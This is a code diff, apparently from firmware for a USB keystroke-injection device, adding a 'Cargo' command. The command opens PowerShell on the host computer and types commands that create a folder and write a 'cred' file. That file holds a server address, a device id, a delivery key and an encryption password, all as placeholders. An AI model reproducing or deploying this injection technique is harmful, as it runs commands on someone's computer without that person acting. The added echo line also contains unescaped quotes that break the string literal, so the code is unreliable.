@@ -99,6 +99,13 @@ void executeCommand(String command)
     Serial.println(command);
     Keyboard.println(payload);
   }
+  else if (command == "Cargo") {
+    openPowerShell();
+    Keyboard.println("cd C:\\");
+    Keyboard.println("mkdir cargo");
+    Keyboard.println("echo \"{"URL": "api.example.com", "Port": "443", "esp_id": "your_esp_id_here", "delivery_key": "your_delivery_key_here", "encryption_password": "YourEncryptionPassword"}\" > C:\\CARGO\\cred");
+
+  }
   else if (command == "None") {
     for (int i = 0; i < 20; i++)
     {
@@ -109,7 +116,7 @@ void executeCommand(String command)
     }
     digitalWrite(LED_BUILTIN, LOW);
   }
-  else
+  else 
   {
     Serial.println("Invalid command");
     for (int i = 0; i < 10; i++)
